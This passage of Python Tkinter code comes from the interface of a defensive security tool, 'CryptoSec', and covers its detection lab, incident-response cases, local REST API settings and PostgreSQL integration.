        folder = os.path.join(self.home, "demo_data")
        try:
            files = csai.generate_demo_data(folder)
        except Exception as e:
            return self.problem(str(e), "Demo data", "err")
        if key not in files:
            return self.problem("There is no demo file for this module.")
        self._lab_ingest_path(os.path.join(folder, files[key]))
        self.toast("Synthetic demo data loaded (not real traffic).", "info")

    def _lab_need_ds(self):
        if not self.lab_ds.get():
            self.problem("Upload a dataset first (or press “Load demo data”).", "No dataset")
            return None
        return self.lab_ds.get()

    def lab_train(self):
        ds = self._lab_need_ds()
        if not ds:
            return
        key, label = self.lab_mod, self.lab_label.get().strip() or None

        def done(r):
            self._lab_refresh_ds()
            m = r.get("metrics", {})
            lines = [f"Trained {r.get('kind')} model for “{key}” (label column: {r.get('label_column') or 'none'})."]
            for k in ("accuracy", "macro_f1", "auc", "n_train", "n_val", "hashes_loaded", "rules_loaded", "entries", "indicators_loaded", "assets_loaded", "contamination", "threshold"):
                if k in m:
                    lines.append(f"  {k}: {m[k]}")
            for c, v in (m.get("per_class") or {}).items():
                lines.append(f"  class {c}: precision {v['precision']} · recall {v['recall']} · F1 {v['f1']} · n={v['support']}")
            if r.get("model_sha256"):
                lines.append(f"  model fingerprint: {r['model_sha256'][:24]}…  (sealed on the blockchain)")
            lines.append("Metrics come from a held-out 20% of YOUR data — synthetic demo data is easy, so expect lower scores on real data.")
            self._lab_say("\n".join(lines))
        self.run_task("Training model…", lambda rep: self.hub.train(key, ds, label), done)

    def _lab_show(self, res):
        self.lab_findings = res.get("findings", [])
        self.lab_tree.tv.delete(*self.lab_tree.tv.get_children())
        for i, f in enumerate(self.lab_findings[:300]):
            self.lab_tree.tv.insert("", "end", iid=str(i), values=(f["score"], f["severity"].upper(), f["verdict"], f["subject"][:60], (f["reasons"] or [""])[0][:110]),
                                    tags=(f["severity"],))
        self._lab_say(_fmt_summary(res) or "No result.")

    def lab_analyze_ds(self):
        ds = self._lab_need_ds()
        if not ds:
            return
        key = self.lab_mod
        self.run_task("Analyzing dataset…", lambda rep: self.hub.analyze_dataset(key, ds), lambda r: (self._lab_show(r), self._ai_refresh_dash()))

    def lab_analyze_input(self):
        key = self.lab_mod
        raw = self.lab_in.get("1.0", "end-1c").strip()
        if not raw and key not in ("predict", "risk"):
            return self.problem("Type or paste something to analyze (see the hint above the box).", "Nothing to analyze")
        item: object = raw
        if raw[:1] in "{[":
            try:
                item = json.loads(raw)
            except ValueError:
                pass
        try:
            f = self.hub.analyze(key, item if raw else {}, emit=True, source="lab")
        except Exception as e:
            return self.problem(str(e), "Could not analyze", "warn")
        self._lab_show({"findings": [f]})
        self.lab_tree.tv.selection_set("0")

    def _lab_row(self, e=None, open_dialog=False):
        sel = self.lab_tree.tv.selection()
        if sel and int(sel[0]) < len(self.lab_findings):
            f = self.lab_findings[int(sel[0])]
            if open_dialog:
                self.show_finding(f)
            else:
                self._lab_say("WHY\n" + "\n".join("  • " + r for r in f["reasons"]) + (f"\nMITRE  {', '.join(f['mitre'])}" if f["mitre"] else "")
                              + ("\n\nPrevention: " + csai.dumps(f["evidence"]["prevention"]["commands"]["linux_iptables"]) if f["evidence"].get("prevention") else ""))

    def lab_scan_file(self):
        p = filedialog.askopenfilename(title="Choose a file to scan (it is only read, never run)")
        if p:
            key = self.lab_mod

            def work(rep):
                rep(0, 0, "Scanning file…")
                return self.hub.scan_file(p, "lab") if key == "malware" else self.hub.detectors["dlp"].analyze_file(p)
            self.run_task("Scanning file…", work, lambda f: (self._lab_show({"findings": [f]}), self.lab_tree.tv.selection_set("0")))

    def lab_pcap(self):
        p = filedialog.askopenfilename(title="Choose a .pcap capture", filetypes=[("Packet capture", "*.pcap"), ("All", "*.*")])
        if p:
            def work(rep):
                with open(p, "rb") as f:
                    res = self.hub.detectors["network"].analyze_pcap(f.read())
                for f_ in res["findings"][:100]:
                    self.hub.emit(f_, "pcap")
                return res
            self.run_task("Analyzing capture…", work, lambda r: (self._lab_show(r), self._ai_refresh_dash()))

    def lab_vuln_scan(self):
        from tkinter import simpledialog
        h = simpledialog.askstring("Port scan", "Host to scan (must be YOUR machine / private network):", initialvalue="127.0.0.1", parent=self.root)
        if h:
            def done(r):
                self._lab_show(r)
                self._lab_say(f"{r['host']} ({r['ip']}): open ports {r['open']}\n" + _fmt_summary({"scanned": r["scanned"]}))
            self.run_task("Scanning ports…", lambda rep: self.hub.detectors["vuln"].scan(h), done)

    def lab_build_features(self):
        b = filedialog.askdirectory(title="Folder of BENIGN files")
        if not b:
            return
        m = filedialog.askdirectory(title="Folder of SUSPECT / MALWARE files (they are only read, never run)")
        if not m:
            return

        def work(rep):
            rows = []
            for lab, folder in (("benign", b), ("malware", m)):
                for fn in sorted(os.listdir(folder))[:2000]:
                    p = os.path.join(folder, fn)
                    if os.path.isfile(p):
                        rep(0, 0, f"Extracting features… {fn[:40]}")
                        try:
                            r = csai.file_features_and_findings(p, None)
                            rows.append({**r["features"], "sha256": r["sha256"], "label": lab})
                        except Exception:
                            pass
            if len(rows) < 10:
                raise ValueError("Need at least 10 readable files across both folders.")
            import io as _io, csv as _csv
            buf = _io.StringIO()
            w = _csv.DictWriter(buf, fieldnames=list(rows[0]))
            w.writeheader()
            w.writerows(rows)
            return self.hub.dataset_save("malware", "my_features.csv", buf.getvalue().encode())
        self.run_task("Building feature dataset…", work, lambda t: (self._lab_refresh_ds(), self.lab_ds.set("my_features.csv"), self.lab_label.set("label"),
                                                                    self._lab_say(f"Built my_features.csv from {len(t)} files. Press Train.")))

    # ── page 3 · INCIDENTS ──────────────────────────────────────────────
    def _build_cases(self):
        sf = ScrollFrame(self.content)
        self.pages["cases"] = sf
        page = sf.inner
        self._page_title(page, "Incident Response", "High-severity findings open cases with a playbook. Nothing touches your OS firewall or accounts: "
                         "“auto-safe” only changes CryptoSec's own blocklist / lock list and prints the commands to enforce elsewhere.")
        top = Card(page, "AUTOMATION")
        top.pack(fill="x", padx=16, pady=(8, 4))
        r = tk.Frame(top.body, bg=CARD)
        r.pack(fill="x")
        tk.Label(r, text="Response mode", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left")
        self.ir_mode = tk.StringVar(value=self.hub.setting("ir_mode"))
        cb = ttk.Combobox(r, textvariable=self.ir_mode, state="readonly", width=12, values=("off", "dry-run", "approve", "auto-safe"))
        cb.pack(side="left", padx=6)
        cb.bind("<<ComboboxSelected>>", lambda e: self.hub.set_setting("ir_mode", self.ir_mode.get()))
        tk.Label(r, text="open a case at score ≥", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left", padx=(14, 2))
        self.ir_thr = tk.StringVar(value=str(self.hub.setting("ir_threshold")))
        self._entry(r, self.ir_thr, 4).pack(side="left")
        self._btn(r, "Save", lambda: self._safe(lambda: self.hub.set_setting("ir_threshold", int(self.ir_thr.get())))).pack(side="left", padx=6)
        self.seal_var = tk.BooleanVar(value=self.hub.setting("seal_alerts"))
        tk.Checkbutton(r, text="seal critical alerts on the blockchain", variable=self.seal_var, bg=CARD, fg=TEXT, selectcolor=INPUT, activebackground=CARD,
                       activeforeground=TEXT, command=lambda: self.hub.set_setting("seal_alerts", self.seal_var.get())).pack(side="left", padx=14)
        mid = tk.Frame(page, bg=BG)
        mid.pack(fill="both", expand=True, padx=16, pady=4)
        c = Card(mid, "CASES")
        c.pack(side="left", fill="both", expand=True, padx=(0, 6))
        self.case_tree = self._tree(c.body, (("id", "Case"), ("sev", "Sev"), ("title", "Title"), ("pb", "Playbook"), ("st", "Status")), (84, 66, 200, 110, 52), 8, "title")
        self.case_tree.pack(fill="both", expand=True)
        self.case_tree.tv.bind("<<TreeviewSelect>>", lambda e: self._case_show())
        row = tk.Frame(c.body, bg=CARD)
        row.pack(fill="x", pady=(6, 0))
        for t, cmd, col in (("▶ Execute safe steps", self.case_exec, GREEN), ("✔ Close case", self.case_close, CARD2), ("↻ Refresh", self._refresh_cases, CARD2)):
            self._btn(row, t, cmd, col, "#06121A" if col == GREEN else TEXT).pack(side="left", padx=(0, 6))
        d = Card(mid, "CASE DETAIL · TIMELINE · COMMANDS")
        d.pack(side="left", fill="both", expand=True, padx=(6, 0))
        self.case_txt = make_text(d.body, height=12, width=64, font=FONT_MS)
        self.case_txt.pack(fill="both", expand=True)
        b = Card(page, "ACTIVE BLOCKLIST (in-app)  ·  LOCKS")
        b.pack(fill="x", padx=16, pady=(4, 12))
        self.block_tree = self._tree(b.body, (("ip", "IP"), ("until", "Until"), ("reason", "Reason"), ("cmd", "Firewall command (run it yourself to enforce)")), (120, 80, 160, 520), 4, "cmd")
        self.block_tree.pack(fill="x")
        r = tk.Frame(b.body, bg=CARD)
        r.pack(fill="x", pady=(6, 0))
        self._btn(r, "Unblock selected", self.unblock_sel).pack(side="left")
        self._btn(r, "🔓 Unlock Reveal", lambda: (self.hub.unlock("reveal"), self.toast("Reveal unlocked.", "ok"))).pack(side="left", padx=6)
        self._refresh_cases()

    def _safe(self, fn):
        try:
            fn()
            self.toast("Saved.", "ok")
        except Exception as e:
            self.problem(str(e), "Could not save", "warn")

    def _refresh_cases(self):
        tv = self.case_tree.tv
        sel = tv.selection()
        tv.delete(*tv.get_children())
        for c in self.hub.ir.list():
            tv.insert("", "end", iid=c["id"], values=(c["id"], c["severity"].upper(), c["title"][:70], c["playbook_title"], c["status"]), tags=(c["severity"],))
        if sel and tv.exists(sel[0]):
            tv.selection_set(sel[0])
        bt = self.block_tree.tv
        bt.delete(*bt.get_children())
        for e in self.hub.ips.list():
            bt.insert("", "end", iid=e["ip"], values=(e["ip"], f"{int((e['until'] - csai.now()) / 60)} min", e["reason"][:30], e["commands"]["linux_iptables"]))

    def _case_show(self):
        sel = self.case_tree.tv.selection()
        c = self.hub.ir.cases.get(sel[0]) if sel else None
        self.case_txt.configure(state="normal")
        self.case_txt.delete("1.0", "end")
        if c:
            t = [f"{c['id']}  ·  {c['severity'].upper()}  ·  mode {c['mode']}  ·  {c['status']}", c["title"], "", "PLAYBOOK: " + c["playbook_title"]]
            for i, s in enumerate(c["steps"], 1):
                t.append(f" {i}. [{s['status']:7}] {s['action']}  {s['target'] or ''}\n      {s['detail']}")
                for k, v in (s.get("commands") or {}).items():
                    t.append(f"         {k}: {v}")
            t += ["", "TIMELINE"] + [f"  {fmt_time(x['ts'])[11:19]}  {x['event']}" for x in c["timeline"][-15:]]
            self.case_txt.insert("1.0", "\n".join(t))
        self.case_txt.configure(state="disabled")

    def case_exec(self):
        sel = self.case_tree.tv.selection()
        if sel:
            try:
                self.hub.ir.execute(sel[0])
                self.toast("Safe steps executed.", "ok")
            except Exception as e:
                self.problem(str(e), "Could not execute", "err")
            self._refresh_cases()
            self._case_show()

    def case_close(self):
        sel = self.case_tree.tv.selection()
        if sel:
            self.hub.ir.close(sel[0])
            self._refresh_cases()
            self._case_show()

    def unblock_sel(self):
        sel = self.block_tree.tv.selection()
        if sel:
            self.hub.ips.unblock(sel[0])
            self._refresh_cases()

    # ── page 4 · API & SETTINGS ─────────────────────────────────────────
    def _build_api_page(self):
        sf = ScrollFrame(self.content)
        self.pages["api"] = sf
        page = sf.inner
        self._page_title(page, "API & Settings", "A local REST API exposes the whole pipeline — detection, datasets, training, hide/reveal/verify, ledger, intel, "
                         "incident response — to your own scripts. It listens on 127.0.0.1 only and needs the API key.")
        c = Card(page, "REST API")
        c.pack(fill="x", padx=16, pady=(8, 4))
        r = tk.Frame(c.body, bg=CARD)
        r.pack(fill="x")
        tk.Label(r, text="Port", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left")
        self.api_port = tk.StringVar(value=str(self.hub.setting("api_port")))
        self._entry(r, self.api_port, 6).pack(side="left", padx=6)
        self.api_btn = self._btn(r, "▶ Start API", self.api_toggle, GREEN, "#06121A")
        self.api_btn.pack(side="left")
        self.api_lbl = tk.Label(r, text="stopped", font=FONT_S, fg=MUTED, bg=CARD)
        self.api_lbl.pack(side="left", padx=10)
        self.api_auto = tk.BooleanVar(value=self.hub.setting("api_autostart"))
        tk.Checkbutton(r, text="start automatically", variable=self.api_auto, bg=CARD, fg=TEXT, selectcolor=INPUT, activebackground=CARD, activeforeground=TEXT,
                       command=lambda: self.hub.set_setting("api_autostart", self.api_auto.get())).pack(side="left", padx=10)
        self._btn(r, "Open docs", self.api_docs).pack(side="right")
        r = tk.Frame(c.body, bg=CARD)
        r.pack(fill="x", pady=(8, 0))
        tk.Label(r, text="API key", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left")
        self.api_key_var = tk.StringVar(value="•" * 24)
        self._shown = False
        self._entry(r, self.api_key_var, 44).pack(side="left", padx=6)
        for t, cmd in (("Show", self.api_key_show), ("Copy", self.api_key_copy), ("Regenerate", self.api_key_regen)):
            self._btn(r, t, cmd).pack(side="left", padx=2)
        self.api_curl = make_text(c.body, height=6, font=FONT_MS)
        self.api_curl.pack(fill="x", pady=(8, 0))
        self._build_db_card(page)
        e = Card(page, "ENDPOINTS")
        e.pack(fill="both", expand=True, padx=16, pady=4)
        self.api_tree = self._tree(e.body, (("m", "Method"), ("p", "Path"), ("s", "What it does")), (60, 250, 520), 8, "s")
        self.api_tree.pack(fill="both", expand=True)
        tmp = csai.ApiServer(self.hub, {})
        for m, _, pat, _, summ, auth in tmp.routes:
            self.api_tree.tv.insert("", "end", values=(m, pat, summ))
        s = Card(page, "AI SETTINGS")
        s.pack(fill="x", padx=16, pady=(4, 12))
        r = tk.Frame(s.body, bg=CARD)
        r.pack(fill="x")
        tk.Label(r, text="Alert threshold", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left")
        self.v_alert = tk.StringVar(value=str(self.hub.setting("alert_threshold")))
        self._entry(r, self.v_alert, 4).pack(side="left", padx=4)
        tk.Label(r, text="Webhook URL", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left", padx=(12, 2))
        self.v_hook = tk.StringVar(value=self.hub.setting("webhook_url"))
        self._entry(r, self.v_hook, 30).pack(side="left", padx=4)
        self.v_dlp = tk.StringVar(value=self.hub.setting("dlp_policy"))
        tk.Label(r, text="DLP policy", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left", padx=(12, 2))
        ttk.Combobox(r, textvariable=self.v_dlp, state="readonly", width=7, values=("allow", "warn", "block")).pack(side="left")
        r = tk.Frame(s.body, bg=CARD)
        r.pack(fill="x", pady=(8, 0))
        self.v_llm = tk.BooleanVar(value=self.hub.setting("llm_enabled"))
        tk.Checkbutton(r, text="AI explainer (optional LLM — sends only sanitised finding summaries, never messages/keys/files)", variable=self.v_llm, bg=CARD,
                       fg=TEXT, selectcolor=INPUT, activebackground=CARD, activeforeground=TEXT).pack(side="left")
        r = tk.Frame(s.body, bg=CARD)
        r.pack(fill="x", pady=(4, 0))
        tk.Label(r, text="Anthropic API key", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left")
        self.v_llmkey = tk.StringVar(value="")
        self._entry(r, self.v_llmkey, 34, show="•").pack(side="left", padx=6)
        tk.Label(r, text="(or set env ANTHROPIC_API_KEY — safer)", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left")
        self._btn(r, "Save settings", self.save_ai_settings, ACCENT, "#06121A").pack(side="right")
        self._api_curl_text()

    def _api_curl_text(self):
        port = self.api.port if self.api and self.api.httpd else self.api_port.get()
        k = self.hub.api_key if self._shown else "<API-KEY>"
        txt = (f"B=http://127.0.0.1:{port}/api/v1; K={k}\n"
               f"curl -H \"Authorization: Bearer $K\" $B/status\n"
               f"curl -H \"Authorization: Bearer $K\" $B/detect/phishing -d '{{\"input\":\"http://paypal-verify.login.tk/a\"}}'\n"
               f"curl -H \"Authorization: Bearer $K\" -X POST \"$B/datasets/fraud?name=tx.csv&train=1&analyze=1\" --data-binary @tx.csv\n"
               f"curl -H \"Authorization: Bearer $K\" $B/pipeline/hide -d '{{\"cover_b64\":\"…\",\"message\":\"hi\",\"secret\":\"pass\"}}'")
        self.api_curl.configure(state="normal")
        self.api_curl.delete("1.0", "end")
        self.api_curl.insert("1.0", txt)
        self.api_curl.configure(state="disabled")

    def api_toggle(self):
        if self.api and self.api.httpd:
            self.api.stop()
            self.toast("API stopped.", "info")
        else:
            try:
                port = int(self.api_port.get())
                self.hub.set_setting("api_port", port)
                self.api = csai.ApiServer(self.hub, self.flow.api_ops())
                self.api.start("127.0.0.1", port)
                self.toast(f"API listening on 127.0.0.1:{self.api.port}", "ok")
            except Exception as e:
                self.api = None
                self.problem(f"Could not start the API:\n{e}", "API", "err")
        self._api_curl_text()
        self._ai_refresh_dash()

    def api_docs(self):
        if self.api and self.api.httpd:
            webbrowser.open(f"http://127.0.0.1:{self.api.port}/api/v1/docs")
        else:
            self.toast("Start the API first.", "warn")

    def api_key_show(self):
        self._shown = not self._shown
        self.api_key_var.set(self.hub.api_key if self._shown else "•" * 24)
        self._api_curl_text()

    def api_key_copy(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.hub.api_key)
        self.toast("API key copied.", "ok")

    def api_key_regen(self):
        if messagebox.askyesno("New API key", "Create a new key? Existing scripts will stop working until updated.", parent=self.root):
            self.hub.rotate_api_key()
            self._shown = False
            self.api_key_var.set("•" * 24)
            self._api_curl_text()

    def save_ai_settings(self):
        try:
            self.hub.set_setting("alert_threshold", int(self.v_alert.get()))
            self.hub.set_setting("webhook_url", self.v_hook.get().strip())
            self.hub.set_setting("dlp_policy", self.v_dlp.get())
            self.hub.set_setting("llm_enabled", self.v_llm.get())
            if self.v_llmkey.get().strip():
                self.hub.set_setting("llm_api_key", self.v_llmkey.get().strip())
                self.v_llmkey.set("")
            self.toast("AI settings saved.", "ok")
        except Exception as e:
            self.problem(str(e), "Could not save", "warn")

    # ── live refresh loop ───────────────────────────────────────────────
    def _ai_page_shown(self, key):
        if key == "cases":
            self._refresh_cases()
        elif key == "lab":
            self._lab_refresh_ds()
        self._ai_refresh_dash()

    def _ai_refresh_dash(self):
        h = self.hub
        s = h.alerts.counts(24)
        self.st_alerts.val.configure(text=str(s["total"]))
        self.st_crit.val.configure(text=str(s["by_severity"].get("critical", 0) + s["by_severity"].get("high", 0)))
        self.st_cases.val.configure(text=str(len(h.ir.list("open"))))
        self.st_blk.val.configure(text=str(len(h.ips.list())))
        self.st_ioc.val.configure(text=str(len(h.ti.iocs) + len(h.ioc_hashes)))
        self.st_models.val.configure(text=f"{sum(1 for d in h.detectors.values() if d.model or d.trained_on)}/19")
        m = h.monitor.status()
        if m["running"]:
            st = m["stats"]
            self.mon_btn.configure(text="■  Stop monitoring")
            self.mon_btn.set_color(RED, "white")
            self.mon_lbl.configure(text=f"● live · {st['lines']} lines · {st['files']} files · {st['alerts']} alerts", fg=GREEN)
        else:
            self.mon_btn.configure(text="▶  Start monitoring")
            self.mon_btn.set_color(GREEN, "#06121A")
            self.mon_lbl.configure(text="stopped", fg=MUTED)
        if hasattr(self, "api_btn"):
            on = bool(self.api and self.api.httpd)
            self.api_btn.configure(text="■ Stop API" if on else "▶ Start API")
            self.api_btn.set_color(RED if on else GREEN, "white" if on else "#06121A")
            self.api_lbl.configure(text=f"● http://127.0.0.1:{self.api.port}/api/v1" if on else "stopped", fg=GREEN if on else MUTED)
        crit = s["by_severity"].get("critical", 0) + s["by_severity"].get("high", 0)
        self.ai_chip.configure(text=f"🧠 AI · {s['total']} alert{'s' if s['total'] != 1 else ''}" + (" ⚠" if crit else "") + (" · 🐘" if self.hub.pg is not None and self.hub.pg.connected else ""),
                               fg=RED if crit else GREEN)
        if hasattr(self, "pg_btn"):
            self._pg_refresh()
        if self.hub.pg is not None and self.hub.pg.connected and getattr(self.flow, "_mirrored_h", -2) != self.ledger.height:
            threading.Thread(target=self.flow.mirror, daemon=True).start()

    def _ai_refresh_risk(self):
        reg = self.hub.detectors["risk"].register()
        col = GREEN if reg["org_risk"] < 25 else GOLD if reg["org_risk"] < 50 else RED
        self.risk_lbl.configure(text=f"Posture {reg['posture']:.0f}/100   ·   organisational risk {reg['org_risk']:.0f}", fg=col)
        self.risk_meter.set(reg["org_risk"] / 100, col)
        self.risk_top.configure(text="Top risks: " + ("; ".join(f"{i['entity']} ({i['band']} {i['risk']:.0f})" for i in reg["items"][:3]) or "none yet — run a detection or start the monitor"))

    def _ai_tick(self):
        try:
            if self.hub is None:
                return
            self._tick_n += 1
            for it in self.hub.bus.since(self._bus_seq, 300, ("alert", "case", "sealed", "lock", "error", "model")):
                k, d = it["kind"], it["data"]
                if k == "alert":
                    self._add_alert_row(d)
                    if d["score"] >= 85 and d["module"] != "dlp":
                        self.toast(f"🚨 {d['severity'].upper()}: {d['subject'][:60]}", "err" if d["score"] >= 90 else "warn")
                elif k == "case":
                    self._refresh_cases()
                    self.toast(f"Case {d['id']} opened ({d['mode']})", "warn")
                elif k == "sealed":
                    self.log(f"⛓ {d['count']} AI record(s) sealed on the blockchain ({', '.join(d['types'])})", "ok")
                    self.refresh_ledger_ui()
                elif k == "lock":
                    self.toast("🔒 Reveal locked for 15 min after repeated wrong passphrases.", "warn")
                elif k == "error":
                    self.log(f"AI engine: {d.get('where')}: {d.get('error')}", "warn")
                elif k == "model":
                    self._lab_refresh_ds() if self.current_page == "lab" else None
            if self.hub.bus.seq != self._bus_seq:
                self._bus_seq = self.hub.bus.seq
            while True:
                try:
                    m = self._ai_q.get_nowait()
                except queue.Empty:
                    break
                if m[0] == "scan":
                    _, tag, path, f = m
                    lvl = "err" if f["score"] >= 75 else "warn" if f["score"] >= 40 else "ok"
                    self.log(f"🧠 AI scan ({tag}) {os.path.basename(path)}: {f['verdict'].upper()} — {f['reasons'][0][:110]}", lvl)
                    if f["score"] >= 40:
                        self.toast(f"AI: {os.path.basename(path)} looks {f['verdict']}", "err" if f["score"] >= 75 else "warn")
                    if tag == "Verify":
                        self.ver_ai = (path, f)
                        self.render_verify()
                elif m[0] == "explain":
                    win = self._dialog("AI explanation", 560, 360)
                    t = make_text(win, height=12)
                    t.pack(fill="both", expand=True, padx=16, pady=16)
                    t.insert("1.0", m[2])
                    t.configure(state="disabled")
            if self._tick_n % 3 == 0:
                self._ai_refresh_dash()
            if self._tick_n % 8 == 1:
                self._ai_refresh_risk()
        except Exception as e:                           # the live loop must never die
            self.log(f"AI refresh error: {e}", "warn")
        self.root.after(1200, self._ai_tick)

    def _ai_file_check(self, path, tag):
        def run():
            try:
                f = self.hub.scan_file(path, f"gui:{tag}")
                self._ai_q.put(("scan", tag, path, f))
            except Exception:
                pass
        threading.Thread(target=run, daemon=True).start()

    def _ai_verify_lines(self):
        if not self.ver_ai or not self.ver_sha:
            return []
        path, f = self.ver_ai
        if f["evidence"].get("sha256") != self.ver_sha:
            return []
        lines = [("head", "AI SECURITY SCAN"), ("info", f"🧠 {f['verdict'].upper()} · risk {f['score']}/100")]
        lines += [("info", "   • " + r) for r in f["reasons"][:5]]
        if f["mitre"]:
            lines.append(("info", "   MITRE ATT&CK: " + ", ".join(f["mitre"])))
        return lines

    def _ai_start(self):
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        if self.hub.pg is not None:
            threading.Thread(target=lambda: self.flow.mirror(True), daemon=True).start()
        self.root.after(800, self._ai_tick)
        self.root.after(400, self._ai_refresh_risk)
        if self.hub.setting("api_autostart"):
            self.root.after(1200, self.api_toggle)

    def _on_close(self):
        try:
            if self.api:
                self.api.stop()
            self.hub.shutdown()
        finally:
            self.root.destroy()

    # ── hooks used by the hide / reveal flows ───────────────────────────
    def _ai_after_hide(self, r):
        ai, pre, post = r.get("ai"), r.get("pre"), r.get("post")
        if not ai or "error" in ai:
            return
        self.log(f"🧠 AI: risk {ai['risk']}/100 · decision {ai['decision']} · cover {ai['cover']['verdict']} · "
                 f"steganalysis footprint {ai['stego_detectability'] if ai['stego_detectability'] is not None else 'n/a'}", "ok" if ai["risk"] < 50 else "warn")
        for w in (pre or {}).get("warnings", []):
            self.log("🧠 " + w, "warn")
        if post and post.get("advice"):
            self.log("🧠 " + post["advice"], "info")

    def _ai_reveal_warnings(self, r):
        w = []
        if r.get("pre"):
            w += r["pre"].get("warnings", [])
        if r.get("post"):
            w += r["post"].get("warnings", [])
        for x in w:
            self.log("🧠 " + x, "warn")
        return w

    # ── PostgreSQL card ─────────────────────────────────────────────────
    def _build_db_card(self, page):
        c = Card(page, "🐘 POSTGRESQL DATABASE")
        c.pack(fill="x", padx=16, pady=4)
        tk.Label(c.body, text="Stores alerts, cases, intelligence, datasets and models in PostgreSQL, keeps a SQL-queryable mirror of the blockchain and a "
                 "hash-chained audit log. The ledger file stays the authority. Off by default.", font=FONT_S, fg=MUTED, bg=CARD, justify="left", anchor="w"
                 ).pack(fill="x")
        r = tk.Frame(c.body, bg=CARD)
        r.pack(fill="x", pady=(8, 0))
        self.pg_mode = tk.StringVar(value=self.hub.setting("pg_mode") if self.hub.setting("pg_mode") != "off" or self.hub.pg is None else "off")
        tk.Label(r, text="Mode", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left")
        ttk.Combobox(r, textvariable=self.pg_mode, state="readonly", width=10, values=("off", "embedded", "external")).pack(side="left", padx=6)
        tk.Label(r, text="DSN (external)", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left", padx=(10, 2))
        self.pg_dsn = tk.StringVar(value="")
        self._entry(r, self.pg_dsn, 40, show="•").pack(side="left", fill="x", expand=True)
        self.pg_btn = self._btn(r, "Connect", self.pg_toggle, GREEN, "#06121A")
        self.pg_btn.pack(side="left", padx=6)
        self.pg_lbl = tk.Label(c.body, text="", font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.pg_lbl.pack(fill="x", pady=(6, 0))
        r2 = tk.Frame(c.body, bg=CARD)
        r2.pack(fill="x", pady=(6, 0))
        for t, cmd in (("⬆ Import local data", self.pg_import), ("🔗 Verify ledger mirror", self.pg_verify_mirror), ("🧾 Verify audit chain", self.pg_verify_audit),
                       ("⚓ Anchor audit on blockchain", self.pg_anchor), ("📊 Analytics", self.pg_analytics), ("💾 Backup…", self.pg_backup)):
            self._btn(r2, t, cmd).pack(side="left", padx=(0, 6))
        self.pg_note = tk.Label(c.body, text="Embedded mode needs:  pip install pgserver \"psycopg[binary]\"   ·   External: set the DSN here or the env var "
                                "CRYPTOSEC_PG_DSN (preferred) — use sslmode=verify-full for remote servers.", font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.pg_note.pack(fill="x", pady=(6, 0))
        autowrap(self.pg_note)
        self._pg_refresh()

    def _pg_refresh(self):
        pg = self.hub.pg
        if pg is not None and pg.connected:
            s = self.hub_pg_status if hasattr(self, "hub_pg_status") else None
            self.pg_btn.configure(text="Disconnect")
            self.pg_btn.set_color(RED, "white")
            self.pg_lbl.configure(text=f"● {pg.mode} · {pg.status().get('version', '')} · write queue {pg.pending()}" + (f" · ⚠ {pg.last_error}" if pg.last_error else ""), fg=GREEN)
        else:
            self.pg_btn.configure(text="Connect")
            self.pg_btn.set_color(GREEN, "#06121A")
            err = self.hub.pg_error or (self.hub.pg.last_error if self.hub.pg is not None else "")
            self.pg_lbl.configure(text=("○ not connected" + (f" — {err}" if err else " — using local files")), fg=ORANGE if err else MUTED)
        if hasattr(self, "ai_chip"):
            self._chip_pg = bool(pg is not None and pg.connected)

    def pg_toggle(self):
        if self.hub.pg is not None:
            self.hub.disconnect_pg()
            self.hub.set_setting("pg_mode", "off")
            self.pg_mode.set("off")
            self._pg_refresh()
            self.toast("PostgreSQL disconnected — local files in use.", "info")
            return
        mode = self.pg_mode.get()
        if mode == "off":
            return self.problem("Choose “embedded” (private database managed for you) or “external” (your own server).", "Choose a mode")
        dsn = self.pg_dsn.get().strip()
        if mode == "external" and not dsn and not os.environ.get("CRYPTOSEC_PG_DSN"):
            return self.problem("Enter a DSN such as\npostgresql://user:password@host:5432/dbname?sslmode=verify-full", "DSN needed")

        def work(rep):
            rep(0, 0, "Connecting to PostgreSQL…" if mode == "external" else "Starting the embedded PostgreSQL server…")
            st = self.hub.connect_pg(mode, dsn)
            rep(0, 0, "Syncing the blockchain mirror…")
            self.flow.mirror(full=True)
            return st

        def done(st):
            self.pg_dsn.set("")
            self._pg_refresh()
            self.toast(f"PostgreSQL connected · {st.get('version', '')}", "ok")
            self.log(f"🐘 PostgreSQL ready ({mode}); existing local data was imported if the database was empty.", "ok")
        self.run_task("Connecting to PostgreSQL…", work, done, on_error=lambda e: (self._pg_refresh(), self.problem(str(e), "PostgreSQL", "err")) and None)

    def _pg_need(self):
        if self.hub.pg is None or not self.hub.pg.connected:
            self.problem("Connect PostgreSQL first.", "Not connected")
            return False
        return True

    def pg_import(self):
        if self._pg_need():
            self.run_task("Importing local data…", lambda rep: self.hub.pg_import_local(),
                          lambda n: self.toast("Imported: " + ", ".join(f"{v} {k}" for k, v in n.items() if v), "ok"))

    def pg_verify_mirror(self):
        if self._pg_need():
            self.flow.mirror()
            def done(r):
                self.problem(f"Chain: {r['blocks_chain']} blocks / {r['tx_chain']} transactions\nDatabase: {r['blocks_db']} blocks / {r['tx_db']} transactions\n\n"
                             + ("✔ The SQL mirror matches the blockchain exactly." if r["ok"] else f"✖ Differences found — mismatched blocks {r['mismatched']}, missing {r['missing_in_db']}.\n"
                                "The ledger file is authoritative; press Import / reconnect to resync the mirror."), "Ledger mirror check", "ok" if r["ok"] else "warn")
            self.run_task("Verifying mirror…", lambda rep: self.flow.mirror_verify(), done)

    def pg_verify_audit(self):
        if self._pg_need():
            def done(r):
                ch = r["chain"]
                self.problem(f"Audit log: {ch['rows']} entries\nHash chain: {'✔ intact' if ch['ok'] else '✖ BROKEN at entry ' + str(ch['first_bad']['id'])}\n"
                             f"Blockchain anchors checked: {r['anchors_checked']}  ·  mismatched: {len(r['anchors_mismatched'])}\n\n"
                             + ("Nothing has been altered." if r["ok"] else "The stored history no longer matches what was sealed — investigate."),
                             "Audit chain check", "ok" if r["ok"] else "err")
